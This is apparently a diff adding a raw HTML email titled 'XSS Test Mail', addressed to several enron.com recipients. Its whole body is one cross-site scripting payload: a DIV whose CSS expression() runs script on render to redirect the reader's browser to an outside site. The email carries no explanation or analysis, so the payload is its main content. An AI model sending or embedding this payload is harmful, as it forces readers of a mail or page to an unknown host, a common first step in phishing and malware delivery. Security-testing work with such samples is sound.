@@ -1,0 +1,7 @@
+From: domestications.198273363@s2u2.com
+To: kevin.hyatt@enron.com, husky1@enron.com, huntley.robert@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<DIV STYLE="width: expression((window.r==1)?'':(window.r=1,window.location.href='http://tools88.com/'));">
